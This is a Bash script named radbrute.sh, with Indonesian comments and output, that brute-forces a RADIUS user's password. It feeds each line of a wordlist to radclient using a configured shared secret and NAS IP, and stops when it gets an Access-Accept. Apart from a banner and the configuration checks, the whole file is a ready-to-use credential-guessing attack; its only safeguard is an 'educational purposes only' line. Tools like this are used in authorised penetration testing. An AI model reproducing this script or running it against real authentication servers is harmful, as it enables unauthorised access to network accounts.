#!/bin/bash
#
#---------------------------------------------------------------------#
#
#.......: radbrute.sh
#.......: Rofi (Fixploit03)
#.......: https://github.com/fixploit03/radbrute
#
#---------------------------------------------------------------------#
# For educational purposes only!

# Variabel warna
m="\e[1;31m" # merah terang
h="\e[1;32m" # hijau terang
k="\e[1;33m" # kuning terang
b="\e[1;34m" # biru terang
p="\e[1;37m" # putih terang
r="\e[0m"    # reset

# Konfigurasi
ip_radius=""
port=""
secret=""
user=""
ip_nas=""
wordlist=""

# Cek IP RADIUS
if [[ -z "${ip_radius}" ]]; then
    echo -e "${m}[-] ${p}IP RADIUS belum dikonfigurasi.${r}"
	exit 1
fi

# Cek port RADIUS
if [[ -z "${port}" ]]; then
	# Port default RADIUS = 1812 (UDP)
	port="1812"
fi

# Cek secret RADIUS
if [[ -z "${secret}" ]]; then
	echo -e "${m}[-] ${p}Secret RADIUS belum dikonfigurasi.${r}"
	exit 1
fi

# Cek user RADIUS
if [[ -z "${user}" ]]; then
	echo -e "${m}[-] ${p}User RADIUS belum dikonfigurasi.${r}"
	exit 1
fi

# Cek IP NAS
if [[ -z "${ip_nas}" ]]; then
	echo -e "${m}[-] ${p}IP NAS belum dikonfigurasi.${r}"
	exit 1
fi

# Cek wordlist
if [[ ! -f "${wordlist}" ]]; then
	echo -e "${m}[-] ${p}Wordlist '${m}${wordlist}${p}' tidak ditemukan.${r}"
	exit 1
fi

# Banner
clear
echo -e "${m} ______    _______  ______   _______  ______    __   __  _______  _______ ${r}"
echo -e "${m}|    _ |  |   _   ||      | |  _    ||    _ |  |  | |  ||       ||       |${r}"
echo -e "${m}|   | ||  |  |_|  ||  _    || |_|   ||   | ||  |  | |  ||_     _||    ___|${r}"
echo -e "${m}|   |_||_ |       || | |   ||       ||   |_||_ |  |_|  |  |   |  |   |___ ${r}"
echo -e "${m}|    __  ||       || |_|   ||  _   | |    __  ||       |  |   |  |    ___|${r}"
echo -e "${m}|   |  | ||   _   ||       || |_|   ||   |  | ||       |  |   |  |   |___ ${r}"
echo -e "${m}|___|  |_||__| |__||______| |_______||___|  |_||_______|  |___|  |_______|${r}"
echo -e "                                                                                  "
echo -e "      ${h}Script Bash sederhana untuk mencari kredensial user yang valid${r}      "
echo -e "                      ${k}Dibuat oleh: ${p}Rofi (Fixploit03)${r}                  "
echo -e "              ${k}Github: ${p}https://github.com/fixploit03/radbrute${r}        \n"

# Running serangan
while read -r password; do
	echo -e "${b}[*] ${p}Mencoba password: ${b}${password}${r}"

	# Kirim respon pake radclient
	respon=$(echo -e "User-Name = \"${user}\"\nUser-Password = \"${password}\"\nNAS-IP-Address = ${ip_nas}" | radclient -x "${ip_radius}:${port}" auth "${secret}" 2>/dev/null)

	# Cek respon
	#
	# Access-Accept
	if echo "${respon}" | grep -q "Access-Accept"; then
		echo -e "${h}[+] ${p}Password ditemukan: ${h}${password}${r}\n"
		exit 0
	# Access-Reject
	elif echo "${respon}" | grep -q "Access-Reject"; then
		echo -e "${m}[-] ${p}Password salah: ${m}${password}${r}"
	# Kaga ada respon
	else
		echo -e "${m}[-] ${p}Tidak ada respon / Timeout${r}"
	fi

	sleep 1
done < "${wordlist}"

# Ga ada password yang ditemukan
echo -e "\n${m}[-] ${p}Tidak ada password yang valid ditemukan. Cobalah gunakan wordlist yang lain :)\n${r}"
exit 1
